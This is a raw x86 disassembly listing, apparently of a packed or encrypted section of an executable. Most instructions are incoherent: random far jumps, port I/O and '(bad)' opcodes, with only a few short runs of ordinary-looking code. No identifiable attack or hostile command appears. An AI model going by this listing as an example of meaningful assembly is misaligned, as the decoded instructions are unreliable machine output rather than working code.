  405172:	pop    es
  405173:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  405174:	xchg   ebp,eax
  405175:	scas   eax,DWORD PTR es:[edi]
  405176:	call   0x368f:0x9e32
  40517c:	and    bl,BYTE PTR ds:0xaa374f6f
  405182:	mov    edi,0xbbf29918
  405187:	and    ecx,edx
  405189:	mov    eax,ebx
  40518b:	aas    
  40518c:	fs dec eax
  40518e:	lahf   
  40518f:	jecxz  0x40511b
  405191:	repz in eax,0x1c
  405194:	xchg   ecx,eax
  405195:	xchg   ebx,eax
  405196:	ins    BYTE PTR es:[edi],dx
  405197:	in     eax,0x15
  405199:	pop    esi
  40519a:	ror    DWORD PTR [edx],cl
  40519c:	push   0xffffffec
  40519e:	cmc    
  40519f:	or     DWORD PTR [esi-0x44ede6d6],esi
  4051a5:	sbb    al,0xd1
  4051a7:	lock cmp DWORD PTR [eax+0x7f],eax
  4051ab:	and    al,0x5c
  4051ad:	pop    es
  4051ae:	or     edi,DWORD PTR [eax]
  4051b0:	push   esp
  4051b1:	mov    ds:0x6cd22920,eax
  4051b6:	jnp    0x4051d0
  4051b8:	xchg   esi,eax
  4051b9:	leave  
  4051ba:	cmp    al,0x66
  4051bc:	in     al,0x50
  4051be:	cmc    
  4051bf:	into   
  4051c0:	mov    edx,DWORD PTR [ebx+eax*1-0x3e485cfc]
  4051c7:	jae    0x40521c
  4051c9:	loopne 0x405159
  4051cb:	add    al,0x87
  4051cd:	ja     0x405163
  4051cf:	add    al,0x13
  4051d1:	push   ecx
  4051d2:	xlat   BYTE PTR ds:[ebx]
  4051d3:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4051d4:	jle    0x4051ed
  4051d6:	test   BYTE PTR [ebx],dl
  4051d8:	pop    edi
  4051d9:	gs lahf 
  4051db:	mov    esp,0x48943906
  4051e0:	sar    BYTE PTR ds:0x5e8b5866,0xfc
  4051e7:	rcr    DWORD PTR [esi],cl
  4051e9:	xor    BYTE PTR [esi+ebx*8+0x76],dh
  4051ed:	push   edi
  4051ee:	mov    DWORD PTR [esi],ecx
  4051f0:	aam    0xa1
  4051f2:	or     ah,BYTE PTR [ebx+eiz*4+0x46d4da6c]
  4051f9:	adc    ebx,DWORD PTR [ebx+0x77]
  4051fc:	je     0x405246
  4051fe:	cli    
  4051ff:	clc    
  405200:	xchg   esp,eax
  405201:	ror    BYTE PTR [edx-0x5fb4a06a],0xe7
  405208:	adc    DWORD PTR [ecx+0x71],0xcb9d6d60
  40520f:	pop    ecx
  405210:	mov    ebp,0x8f25c90c
  405215:	in     eax,dx
  405216:	mov    edi,0xfa96e9f0
  40521b:	mov    ds:0xc2c45ced,al
  405220:	sub    eax,0x31cdbeab
  405225:	push   eax
  405226:	add    edx,DWORD PTR [edx+0x772adb22]
  40522c:	leave  
  40522d:	pop    ecx
  40522e:	test   eax,0xa3f4de02
  405233:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  405234:	ja     0x405215
  405236:	or     esi,DWORD PTR [edi]
  405238:	out    0x21,eax
  40523a:	jp     0x4051df
  40523c:	daa    
  40523d:	mov    esp,0x9e436aff
  405242:	scas   eax,DWORD PTR es:[edi]
  405243:	mov    bh,0x9d
  405245:	enter  0xd4d6,0x73
  405249:	mov    cl,BYTE PTR [eax-0x2d]
  40524c:	cmp    ecx,DWORD PTR [ecx]
  40524e:	dec    edx
  40524f:	jl     0x40524d
  405251:	stc    
  405252:	pop    edx
  405253:	mov    ebx,0x5a976865
  405258:	lods   al,BYTE PTR cs:[esi]
  40525a:	pop    ecx
  40525b:	and    BYTE PTR [eax+0x2fe5ec04],al
  405261:	jmp    0x4051f4
  405263:	daa    
  405264:	mov    al,cl
  405266:	test   eax,0xe915f6fb
  40526b:	ds pop ss
  40526d:	(bad)  
  40526e:	sub    al,ah
  405270:	or     eax,0xbd7051f9
  405275:	push   ecx
  405276:	pop    ebx
  405277:	mov    ch,0xdb
  405279:	or     eax,0xc33071
  40527e:	add    bh,dl
  405280:	mov    ebp,0x212f834b
  405285:	test   al,0xc
  405287:	cmp    dl,BYTE PTR [ebp-0x271148c]
  40528d:	jg     0x405303
  40528f:	jg     0x405302
  405291:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  405292:	dec    ecx
  405293:	pop    eax
  405294:	aam    0xa1
  405296:	stos   DWORD PTR es:[edi],eax
  405297:	pop    edx
  405298:	mov    edx,0x7aadb874
  40529d:	int3   
  40529e:	ret    0x1f22
  4052a1:	pop    eax
  4052a2:	sub    BYTE PTR [esi+0x41350d18],dh
  4052a8:	dec    DWORD PTR [edi]
  4052aa:	(bad)
  4052ad:	add    bh,dh
  4052af:	clc    
  4052b0:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4052b1:	dec    ebx
  4052b2:	cmp    bh,BYTE PTR [ebx-0x236bcc40]
  4052b8:	imul   edi,DWORD PTR [esi-0x767390af],0xffffffaa
  4052bf:	jl     0x405248
  4052c1:	pop    ds
  4052c2:	sub    eax,0x7cc099b0
  4052c7:	dec    esi
  4052c8:	sbb    DWORD PTR [ebx],ebp
  4052ca:	sub    BYTE PTR [ebx+0x7f],dl
  4052cd:	inc    eax
  4052ce:	pop    ss
  4052cf:	mov    edx,0x1b9dbe5b
  4052d4:	and    eax,0xdd10dfa8
  4052d9:	or     eax,0x4b1cc6aa
  4052de:	mov    eax,0x6b8993c9
  4052e3:	push   esp
  4052e4:	pop    eax
  4052e5:	add    eax,0x73bba570
  4052ea:	loopne 0x40531f
  4052ec:	jge    0x4052dd
  4052ee:	mov    esi,0xc8b0e727
  4052f3:	jo     0x40534f
  4052f5:	xor    DWORD PTR [esi],ebp
  4052f7:	imul   edi,DWORD PTR [ebx],0xfc0e07c3
  4052fd:	stc    
  4052fe:	mov    ecx,0x4a6b7ce7
  405303:	sub    ch,BYTE PTR [ebx+0x2f8199e6]
  405309:	mov    eax,0x731aae7a
  40530e:	(bad)  
  40530f:	ds mov dl,0x3
  405312:	xchg   ecx,eax
  405313:	stos   DWORD PTR es:[edi],eax
  405314:	xchg   ecx,eax
  405315:	test   dh,0x10
  405318:	sub    eax,0xc6a41a27
  40531d:	(bad)  
  40531f:	arpl   WORD PTR [eax],bp
  405321:	pop    esi
  405322:	ins    DWORD PTR es:[edi],dx
  405323:	pusha  
  405324:	add    DWORD PTR [ebp+0x74],eax
  405327:	jge    0x405312
  405329:	xchg   edi,eax
  40532a:	loope  0x4052ef
  40532c:	loopne 0x405319
  40532e:	cmp    al,0x35
  405330:	mov    edi,ecx
  405332:	repz xchg esp,eax
  405334:	xor    eax,0x48097ea1
  405339:	xor    eax,ebp
  40533b:	pop    ebx
  40533c:	pop    eax
  40533d:	popf   
  40533e:	mov    esp,0x8f15f73f
  405343:	icebp  
  405344:	scas   eax,DWORD PTR es:[edi]
  405345:	xchg   edx,eax
  405346:	arpl   WORD PTR [esi-0x5ef77bad],cx
  40534c:	(bad)  
  40534d:	out    dx,al
  40534e:	(bad)  
  40534f:	retf   
  405350:	xchg   BYTE PTR [edi-0xb0719d1],bl
  405356:	or     eax,0xb73a4a64
  40535b:	cmp    DWORD PTR [edi],edi
  40535d:	push   ebp
  40535e:	test   BYTE PTR [esp+ebx*8-0x74],bl
  405362:	dec    ecx
  405363:	xlat   BYTE PTR ds:[ebx]
  405364:	(bad)  
  405365:	and    BYTE PTR [ebx],ch
  405367:	adc    al,0xe
  405369:	aaa    
  40536a:	in     al,0x44
  40536c:	out    dx,eax
  40536d:	or     edx,DWORD PTR [ecx]
  40536f:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  405370:	das    
  405371:	(bad)  
  405372:	push   esp
  405373:	mov    bh,0x5e
  405375:	xor    eax,0xc62e2481
  40537a:	inc    ebx
  40537b:	sbb    eax,0x29e4948b
  405380:	scas   eax,DWORD PTR es:[edi]
  405381:	or     DWORD PTR [ebx+0x47],0xc2c529df
  405388:	mov    ah,0xe5
  40538a:	icebp  
  40538b:	inc    eax
  40538c:	lock sbb al,0xfb
  40538f:	addr16 mov ds:0x6113,eax
  405393:	jnp    0x4053c1
  405395:	cmc    
  405396:	push   es
  405397:	int3   
  405398:	add    al,0x39
  40539a:	js     0x4053d4
  40539c:	popf   
  40539d:	mov    ecx,0x47b8211e
  4053a2:	pushf  
  4053a3:	dec    edx
  4053a4:	xchg   edx,eax
  4053a5:	imul   ecx,DWORD PTR [esi+ebp*4+0x5fe8ef5e],0x17
  4053ad:	hlt    
  4053ae:	int    0xf5
  4053b0:	popa   
  4053b1:	jl     0x40537c
  4053b3:	jbe    0x405420
  4053b5:	repz xor eax,0xe6012366
  4053bb:	push   ss
  4053bc:	mov    ebx,0x720e42c
  4053c1:	inc    esi
  4053c2:	in     al,dx
  4053c3:	int    0xed
  4053c5:	data16 fstp QWORD PTR [esp+edi*4+0x16]
  4053ca:	in     eax,dx
  4053cb:	push   esi
  4053cc:	xor    eax,0x80de79f1
  4053d1:	xchg   BYTE PTR [edx+ebx*2+0x3f5fb447],bl
  4053d8:	inc    eax
  4053d9:	push   esi
  4053da:	jg     0x4053fd
  4053dc:	cdq    
  4053dd:	push   edi
  4053de:	popf   
  4053df:	push   ecx
  4053e0:	int    0x7b
  4053e2:	sbb    BYTE PTR [ebp-0x1e40a832],cl
  4053e8:	sbb    BYTE PTR ds:0x74af953f,dl
  4053ee:	adc    BYTE PTR [edi-0x7c],al
  4053f1:	adc    al,0x58
  4053f3:	mov    esp,0x54cec0
  4053f8:	icebp  
  4053f9:	sbb    DWORD PTR [edx-0x4b0c00b6],0xbe19d879
  405403:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  405404:	fsubp  st(0),st
  405406:	and    al,0x82
  405408:	mov    ah,0x15
  40540a:	pop    ds
  40540b:	xchg   ecx,eax
  40540c:	je     0x40547a
  40540e:	inc    edx
  40540f:	std    
  405410:	mov    ecx,0x47a5f472
  405415:	fnstenv [edi]
  405417:	xchg   edx,eax
  405418:	xchg   edi,eax
  405419:	push   0xfffffffc
  40541b:	mov    BYTE PTR ds:0xd7e786c3,ah
  405421:	xor    eax,0x2683f82f
  405426:	mov    al,ds:0xcb6ab599
  40542b:	dec    ebx
  40542c:	jb     0x4053b7
  40542e:	rol    DWORD PTR [eax],cl
  405430:	sti    
  405431:	jbe    0x405483
  405433:	jmp    0x405484
  405435:	pop    ebx
  405436:	pop    esp
  405437:	sub    eax,0xda683e0b
  40543c:	dec    dh
  40543e:	mov    ebp,DWORD PTR [ebx-0x47]
  405441:	mov    ebp,0x86cd3b4
  405446:	jecxz  0x40540e
  405448:	mov    esi,DWORD PTR [eax+0x72]
  40544b:	outs   dx,DWORD PTR ds:[esi]
  40544c:	into   
  40544d:	mov    ds:0x4128d2d6,al
  405452:	mov    WORD PTR [edx+0xf],ss
  405455:	repz xchg ecx,eax
  405457:	or     al,0xbc
  405459:	fnstcw WORD PTR ds:0x4e1a2cfa
  40545f:	push   edi
  405460:	push   ebp
  405461:	inc    esp
  405462:	lahf   
  405463:	ss mov eax,0xd54cb75b
  405469:	ds or  eax,0xc18e96c3
  40546f:	test   eax,0xe9ca40fc
  405474:	fcomp  DWORD PTR [ebx]
  405476:	xchg   edi,eax
  405477:	pushf  
  405478:	sbb    esi,DWORD PTR [eax+eiz*8]
  40547b:	(bad)  
  40547c:	in     al,dx
  40547d:	(bad)
  405482:	ret    0xc
  405485:	push   ebp
  405486:	mov    ebp,esp
  405488:	push   ecx
  405489:	mov    edx,DWORD PTR ds:0x42e704
  40548f:	mov    edx,DWORD PTR [edx]
  405491:	sbb    DWORD PTR ds:0x42e66b,edx
  405497:	jmp    0x40576a
  40549c:	pop    ecx
  40549d:	scas   al,BYTE PTR es:[edi]
  40549e:	sbb    BYTE PTR [ebx-0xd],al
  4054a1:	push   ecx
  4054a2:	pop    ecx
  4054a3:	mov    dh,0xd4
  4054a5:	(bad)
  4054a8:	in     al,0x1a
  4054aa:	sub    BYTE PTR [ecx+0x70703710],0xaa
  4054b1:	jle    0x405523
  4054b3:	jo     0x40551a
  4054b5:	push   0x3d
  4054b7:	mov    ah,0x47
  4054b9:	adc    al,0xc5
  4054bb:	cmp    DWORD PTR [ebx-0x5dc45fa7],esp
  4054c1:	dec    ecx
  4054c2:	dec    edi
  4054c3:	sar    BYTE PTR [eax-0x62],1
  4054c6:	mov    bl,al
  4054c8:	lahf   
  4054c9:	xor    cl,cl
  4054cb:	in     eax,dx
  4054cc:	(bad)  
  4054cd:	mov    esi,0xcdd8a08e
  4054d2:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4054d3:	sbb    ecx,DWORD PTR [ebx+0x18b93b22]
  4054d9:	retf   
  4054da:	sub    DWORD PTR ds:0x6b7153b7,edi
  4054e0:	data16 jmp 0x40550d
  4054e3:	into   
  4054e4:	dec    esi
  4054e5:	pop    edi
  4054e6:	adc    esi,DWORD PTR [esi]
  4054e8:	xor    dh,BYTE PTR [edx]
  4054ea:	sbb    al,0x81
  4054ec:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4054ed:	and    eax,0x1befe0fb
  4054f2:	ins    DWORD PTR es:[edi],dx
  4054f3:	leave  
  4054f4:	das    
  4054f5:	test   eax,0x8dee976
  4054fa:	ret    
  4054fb:	mov    esi,0xda46c151
  405500:	sbb    DWORD PTR [edi-0x53eee5d5],edx
  405506:	jmp    0x2846dc13
  40550b:	cli    
  40550c:	ror    BYTE PTR ds:0x53201e31,1
  405512:	inc    ebp
  405513:	std    
  405514:	mov    ds:0xeda5f4b9,eax
  405519:	jae    0x40552a
  40551b:	add    DWORD PTR [ecx+0x4e82bb22],esi
  405521:	cmp    ch,BYTE PTR [ebp+ebx*4-0x4cba3006]
  405528:	enter  0x297e,0x9f
  40552c:	mov    al,ds:0x368caf79
  405531:	mov    al,0x6e
  405533:	outs   dx,BYTE PTR ds:[esi]
  405534:	sbb    BYTE PTR [edi-0x4c9e4867],bl
  40553a:	lods   al,BYTE PTR ds:[esi]
  40553b:	mov    al,0x10
  40553d:	or     DWORD PTR [edx-0x6d13a412],esi
  405543:	mov    ebp,0x3ccb48e8
  405548:	in     al,dx
  405549:	stos   DWORD PTR es:[edi],eax
  40554a:	fisubr WORD PTR [edi+0x5f309960]
  405550:	pop    eax
  405551:	out    0xb3,eax
  405553:	jmp    0x9298:0xf599b0a7
  40555a:	add    eax,0x172d86f5
  40555f:	mov    esp,0x3648b841
  405564:	jo     0xf1c745a
  40556a:	pop    fs
  40556c:	or     BYTE PTR [ebp+ebp*2-0x2a],ah
  405570:	adc    ebx,DWORD PTR [edx]
  405572:	into   
  405573:	or     bl,BYTE PTR [ebx]
  405575:	jg     0x405514
  405577:	dec    ebx
  405578:	adc    BYTE PTR [ebx],bh
  40557a:	dec    esp
  40557b:	fdivr  DWORD PTR [bx+si]
  40557e:	fidiv  DWORD PTR [edi]
  405580:	jne    0x405542
  405582:	add    DWORD PTR [edi+0x30b2072b],0x1fc956d4
  40558c:	les    edi,FWORD PTR [edi-0x1cd2987b]
  405592:	jmp    0x44ab5978
  405597:	rol    BYTE PTR [ebp+0x124500c5],cl
  40559d:	inc    edx
  40559e:	popf   
  40559f:	or     eax,0x735fc21b
  4055a4:	call   0xaad9:0xceabcd71
  4055ab:	xchg   ebp,eax
  4055ac:	mov    eax,0x72889374
  4055b1:	call   0x61b4eb0e
  4055b6:	adc    eax,0xa782345f
  4055bb:	push   cs
  4055bc:	cli    
  4055bd:	adc    eax,0x2489455
  4055c2:	(bad)  
  4055c4:	int3   
  4055c5:	push   ebx
  4055c6:	aaa    
  4055c7:	mov    al,0x80
  4055c9:	outs   dx,BYTE PTR ds:[esi]
  4055ca:	js     0x4055ba
  4055cc:	mov    ds:0x3673b0ba,al
  4055d1:	adc    eax,0x60d3bfe2
  4055d6:	dec    ecx
  4055d7:	popa   
  4055d8:	ret    
  4055d9:	mov    al,ds:0x3106d332
  4055de:	add    edi,esp
  4055e0:	(bad)  
  4055e3:	pushf  
  4055e4:	int    0xfb
  4055e6:	lods   eax,DWORD PTR ds:[esi]
  4055e7:	mov    ss,WORD PTR [ecx]
  4055e9:	xchg   ebx,eax
  4055ea:	mov    edx,0x2faa15a6
  4055ef:	inc    esp
  4055f0:	or     DWORD PTR [edi-0x3],edx
  4055f3:	int    0xb4
  4055f5:	leave  
  4055f6:	daa    
  4055f7:	hlt    
  4055f8:	loop   0x40561b
  4055fa:	jge    0x40563b
  4055fc:	fnstcw WORD PTR [eax+0x38d5d376]
  405602:	add    al,0x54
  405604:	(bad)
  405607:	loope  0x405596
  405609:	mov    dl,BYTE PTR [ebx+eiz*8]
  40560c:	dec    edx
  40560d:	pop    esp
  40560e:	or     eax,0x58c84fb1
  405613:	fnstenv [edi]
  405615:	adc    DWORD PTR [edi+ecx*2],0x8090d57d
  40561c:	jecxz  0x4055b0
  40561e:	hlt    
  40561f:	lds    edx,FWORD PTR [edi]
  405621:	sub    DWORD PTR [ebx],edx
  405623:	fild   WORD PTR [edi]
  405625:	cmp    BYTE PTR [ebx-0x73cc56ca],dh
  40562b:	mov    al,0xa4
  40562d:	inc    edi
  40562e:	pop    ebx
  40562f:	adc    al,0xf4
  405631:	sbb    BYTE PTR [edx+0x7c],dl
  405634:	inc    eax
  405635:	lock ror dl,cl
  405638:	out    0x83,eax
  40563a:	sub    edi,edi
  40563c:	push   esp
  40563d:	jmp    0x428d483e
  405642:	push   eax
  405643:	xchg   edi,eax
  405644:	xor    bh,cl
  405646:	rcl    dl,0x14
  405649:	lahf   
  40564a:	xchg   dh,ch
  40564c:	pusha  
  40564d:	xor    esi,DWORD PTR [eax-0x78]
  405650:	adc    DWORD PTR [esi+ebx*2],ebp
  405653:	cmp    DWORD PTR [esi],ebp
  405655:	sub    cl,ch
  405657:	fisttp DWORD PTR [edx+ebp*8-0x17]
  40565b:	aam    0xd1
  40565d:	mov    bl,0xe6
  40565f:	les    ebp,FWORD PTR [ebp+0x298b3aef]
  405665:	pop    bx
  405667:	mov    bl,0x24
  405669:	or     bh,BYTE PTR [eax-0x52]
  40566c:	pop    esp
  40566d:	leave  
  40566e:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40566f:	xchg   edi,eax
  405670:	dec    edi
  405671:	push   edi
  405672:	(bad)  
  405673:	stos   DWORD PTR es:[edi],eax
  405674:	test   BYTE PTR [ebx-0x9b3521d],0xa3
  40567b:	mov    esp,0x77c06bd8
  405680:	aas    
  405681:	jo     0x40561b
  405683:	ror    BYTE PTR [esp+edx*8-0x601eae94],1
  40568a:	loopne 0x4056fb
  40568c:	fld    st(7)
  40568e:	dec    ebx
  40568f:	dec    esp
  405690:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  405691:	ror    BYTE PTR [eax],1
  405693:	cmp    ah,BYTE PTR [esi-0x42]
  405696:	mov    eax,ds:0xdbd9995c
  40569b:	sbb    cl,BYTE PTR [edi]
  40569d:	adc    BYTE PTR [ebp+0x6b],ch
  4056a0:	cli    
  4056a1:	adc    DWORD PTR [ecx],edi
  4056a3:	call   0x46d:0xd9e2b49
  4056aa:	jnp    0x40566b
  4056ac:	sbb    al,0x59
  4056ae:	lea    edx,[edx-0x2c5a60b8]
  4056b4:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4056b5:	shr    DWORD PTR [ebx+esi*8-0x39a270df],cl
  4056bc:	(bad)  
  4056bd:	jo     0x405724
  4056bf:	jecxz  0x40566c
  4056c1:	pop    ebp
  4056c2:	pop    DWORD PTR [ebx+0xe]
  4056c5:	dec    DWORD PTR [ebx-0xcd7a19f]
  4056cb:	icebp  
  4056cc:	out    0xbf,eax
  4056ce:	ja     0x405688
  4056d0:	or     edi,edi
  4056d2:	jns    0x4056f1
  4056d4:	sbb    esp,edi
  4056d6:	push   0xc0e8776a
  4056db:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4056dc:	xor    BYTE PTR [ebp+edx*1+0x7d9cb3c3],al
  4056e3:	repnz add al,0x92
  4056e6:	stos   DWORD PTR es:[edi],eax
  4056e7:	cwde   
  4056e8:	iret   
  4056e9:	retf   
  4056ea:	int3   
  4056eb:	push   edx
  4056ec:	mov    dh,0xd
  4056ee:	and    DWORD PTR [ebx+edx*2+0x48a0db9e],edx
  4056f5:	test   dl,cl
  4056f7:	add    cl,BYTE PTR [ecx]
  4056f9:	cmp    bh,BYTE PTR [ecx]
  4056fb:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4056fc:	jg     0x4056a0
  4056fe:	ret    
  4056ff:	popf   
  405700:	push   ebx
  405701:	mov    al,es:0x656b4878
  405707:	fld    TBYTE PTR [esi+0x23522107]
  40570d:	pop    ds
  40570e:	shl    DWORD PTR [eax],0x3d
  405711:	(bad)  [esi-0x1a183ab1]
  405717:	test   ch,ah
  405719:	xor    al,0xfc
  40571b:	dec    edi
  40571c:	ins    DWORD PTR es:[edi],dx
  40571d:	dec    esp
  40571e:	xor    ebx,DWORD PTR [eax]
  405720:	or     ah,bl
  405722:	sbb    BYTE PTR [edi+eax*2+0x18],bh
  405726:	outs   dx,BYTE PTR ds:[esi]
  405727:	rcl    BYTE PTR [ebx],1
  405729:	(bad)  [edi]
  40572b:	mov    ebp,0x56ec1cf
  405730:	sub    eax,0xaef40ae2
  405735:	rcl    ah,0x85
  405738:	dec    ecx
  405739:	jge    0x405721
  40573b:	push   ecx
  40573c:	das    
  40573d:	outs   dx,DWORD PTR ds:[esi]
  40573e:	cmp    ebx,ebx
  405740:	das    
  405741:	adc    ebx,DWORD PTR [ecx-0x2e68f523]
  405747:	ror    BYTE PTR [ecx-0x3c],cl
  40574a:	fst    DWORD PTR [ecx-0x26aaa037]
  405750:	fsubr  DWORD PTR [edx+ecx*2]
  405753:	xor    eax,0x9ebc2134
  405758:	push   ebp
  405759:	push   esp
  40575a:	adc    BYTE PTR [ebp-0xf6d4c19],bh
  405760:	int3   
  405761:	jmp    0x9d6e:0x4cf890f4
  405768:	outs   dx,BYTE PTR ds:[esi]
  405769:	retf   0xf51
  40576c:	mov    bh,0x5
  40576e:	push   es
  40576f:	std    
  405770:	inc    edx
  405771:	add    BYTE PTR [ebx],ah
  405773:	add    eax,0x42fcfa
  405778:	mov    ds:0x42fd06,eax
  40577d:	jmp    0x405a50
  405782:	ja     0x4057cf
  405784:	and    eax,0x717221b4
  405789:	dec    ebx
  40578a:	xchg   DWORD PTR [edx-0x41826e42],eax
  405790:	ds mov bl,0x4a
  405793:	xor    eax,0x7eaa7070
  405798:	jo     0x40580a
  40579a:	mov    eax,0xa908e6e4
  40579f:	jmp    0x1b9:0xb6ac4642
  4057a6:	addr16 mov ecx,0x9491d867
  4057ac:	iret   
  4057ad:	dec    esp
  4057ae:	inc    esp
  4057af:	add    cl,al
  4057b1:	jg     0x405828
  4057b3:	pushf  
  4057b4:	cmps   BYTE PTR ds:[si],BYTE PTR es:[di]
  4057b6:	xlat   BYTE PTR ds:[ebx]
  4057b7:	push   ebp
  4057b8:	jne    0x4057fa
  4057ba:	das    
  4057bb:	cli    
  4057bc:	xchg   eax,edx
  4057be:	cmp    esp,DWORD PTR [esi-0x6e]
  4057c1:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4057c2:	repz shl DWORD PTR [eax+eiz*4+0x439a48a4],1
  4057ca:	xchg   ebp,eax
  4057cb:	shl    dl,1
  4057cd:	pop    ebp
  4057ce:	nop
  4057cf:	mov    ecx,0xe6c0184
  4057d4:	cli    
  4057d5:	test   ch,al
  4057d7:	hlt    
  4057d8:	jbe    0x405818
  4057da:	cmp    eax,0x2fb86a9c
  4057df:	in     al,dx
  4057e0:	xchg   DWORD PTR ds:0x2f6eca58,edi
  4057e6:	cmc    
  4057e7:	arpl   dx,ax
  4057e9:	addr16 mov esp,0x45352de9
  4057ef:	inc    ebp
  4057f0:	mov    DWORD PTR ds:0x193459b2,edi
  4057f6:	enter  0x86d3,0x1b
  4057fa:	push   edx
  4057fb:	mov    ds:0xf3ac1274,eax
  405800:	not    cl
  405802:	scas   al,BYTE PTR es:[edi]
  405803:	mov    ss,WORD PTR [ebp+ebx*1-0x17321899]
  40580a:	or     ebx,DWORD PTR [eax-0x1b]
  40580d:	pop    esi
  40580e:	cmp    eax,0x3078501f
  405813:	imul   ecx,DWORD PTR [edi+0x4e],0x772b8bf0
  40581a:	xchg   ebp,eax
  40581b:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40581c:	mov    ds:0x65311221,eax
  405821:	cmp    al,0x30
  405823:	push   ecx
  405824:	(bad)  
  405825:	js     0x40580f
  405827:	sub    dh,bh
  405829:	inc    esi
  40582a:	popa   
  40582b:	push   0xffffff9a
  40582d:	pop    ebp
  40582e:	pop    ss
  40582f:	(bad)  
  405830:	(bad)  
  405831:	mov    al,ds:0x258a1210
  405836:	adc    bl,BYTE PTR fs:[edi]
  405839:	(bad)  
  40583a:	loop   0x4057c1
  40583c:	(bad)  
  40583d:	fucomip st,st(5)
  40583f:	push   ebp
  405840:	in     al,dx
  405841:	lahf   
  405842:	xchg   BYTE PTR [edx],ch
  405844:	(bad)  
  405846:	mov    dh,0x3c
  405848:	fucomip st,st(7)
  40584a:	dec    DWORD PTR [ecx]
  40584c:	sub    BYTE PTR [ebp-0x12],ah
  40584f:	inc    eax
  405850:	in     al,0x11
  405852:	xchg   esp,eax
  405853:	mov    al,ds:0x7900c653
  405858:	xor    ah,dh
  40585a:	xchg   esi,eax
  40585b:	call   0x79f9:0x12321a42
  405862:	and    eax,0x2feac940
  405867:	stos   BYTE PTR es:[edi],al
  405868:	cmp    al,0x1c
  40586a:	aas    
  40586b:	jae    0x4058c6
  40586d:	loope  0x4058be
  40586f:	pop    ss
  405870:	aaa    
  405871:	aas    
  405872:	outs   dx,BYTE PTR ds:[esi]
  405873:	inc    esi
  405874:	pop    ds
  405875:	jbe    0x405801
  405877:	lods   al,BYTE PTR ds:[esi]
  405878:	push   esi
  405879:	sub    bh,BYTE PTR [ecx-0x1a]
  40587c:	fidivr WORD PTR [eax+eiz*2+0x70]
  405880:	jge    0x4058c9
  405882:	in     al,0xc4
  405884:	add    esp,DWORD PTR [ebp-0x4f4c29f]
  40588a:	cmc    
  40588b:	xor    BYTE PTR [ebx-0x37577549],0xd6
  405892:	retf   0x94ef
  405895:	sub    eax,0x80f601d3
  40589a:	ins    BYTE PTR es:[edi],dx
  40589b:	and    eax,0x476664c0
  4058a0:	push   edx
  4058a1:	xchg   edi,eax
  4058a2:	(bad)  
  4058a4:	retf   0xdf6
  4058a7:	in     al,dx
  4058a8:	mov    edi,0xdc10a7aa
  4058ad:	xor    ah,BYTE PTR [eax-0x12]
  4058b0:	in     eax,0x8a
  4058b2:	cli    
  4058b3:	pop    edi
  4058b4:	mov    cl,0x5b
  4058b6:	mov    ds:0x4c3f4cd0,eax
  4058bb:	fcom   DWORD PTR [eax]
  4058bd:	jns    0x4058b8
  4058bf:	ins    DWORD PTR es:[edi],dx
  4058c0:	push   ecx
  4058c1:	sbb    eax,DWORD PTR [edi]
  4058c3:	jp     0x4058c4
  4058c5:	xor    eax,0x28d325b7
  4058ca:	xor    al,0x12
  4058cc:	sar    DWORD PTR [ebx],cl
  4058ce:	pop    eax
  4058cf:	scas   al,BYTE PTR es:[di]
  4058d1:	(bad)
  4058d4:	daa    
  4058d5:	lea    ecx,[eax+0x742ff1fe]
  4058db:	aad    0xa5
  4058dd:	scas   eax,DWORD PTR es:[edi]
  4058de:	fistp  QWORD PTR [edi+edx*8]
  4058e1:	rol    ebp,cl
  4058e3:	outs   dx,BYTE PTR ds:[esi]
  4058e4:	imul   esi,DWORD PTR [esi+ebp*8-0x63],0xf48df233
  4058ec:	dec    edx
  4058ed:	xlat   BYTE PTR ds:[ebx]
  4058ee:	(bad)  
  4058ef:	sbb    bh,BYTE PTR [ebp-0x4e]
  4058f2:	inc    ebx
  4058f3:	ins    BYTE PTR es:[edi],dx
  4058f4:	mov    dh,0xff
  4058f6:	push   ecx
  4058f7:	mov    al,al
  4058f9:	xchg   edi,eax
  4058fa:	outs   dx,DWORD PTR ds:[esi]
  4058fb:	ins    DWORD PTR es:[edi],dx
  4058fc:	inc    edi
  4058fd:	inc    ebp
  4058fe:	fcomip st,st(2)
  405900:	fcom   DWORD PTR [ebx+0x0]
  405903:	mov    ch,0xdf
  405905:	xchg   ecx,eax
  405906:	jns    0x40591b
  405908:	dec    ebp
  405909:	or     al,0xee
  40590b:	pop    eax
  40590c:	iret   
  40590d:	imul   edi,DWORD PTR [esi],0x3c419f23
  405913:	add    ebp,ecx
  405915:	cwde   
  405916:	and    al,0x46
  405918:	mov    cl,0x4
  40591a:	jae    0x4058c7
  40591c:	aas    
  40591d:	das    
  40591e:	stos   DWORD PTR es:[edi],eax
  40591f:	or     BYTE PTR [edx-0x51],ah
  405922:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  405923:	bound  eax,QWORD PTR [edx+0x2aa50c6b]
  405929:	aas    
  40592a:	or     al,0xe6
  40592c:	sub    eax,0xb9f141f4
  405931:	mov    edi,eax
  405933:	push   ds
  405934:	mov    esp,esp
  405936:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  405937:	mov    ebp,0xad055532
  40593c:	or     BYTE PTR [eax-0x5a],dl
  40593f:	je     0x4058fb
  405941:	into   
  405942:	push   edi
  405943:	fcomp  DWORD PTR cs:[ecx+edi*1-0x5a]
  405948:	or     eax,0x479814c
  40594d:	mov    ds:0x96834ecd,al
  405952:	lock dec eax
  405954:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  405955:	test   al,0x88
  405957:	mov    al,0x4d
  405959:	mov    esi,0xdff0e1f6
  40595e:	pusha  
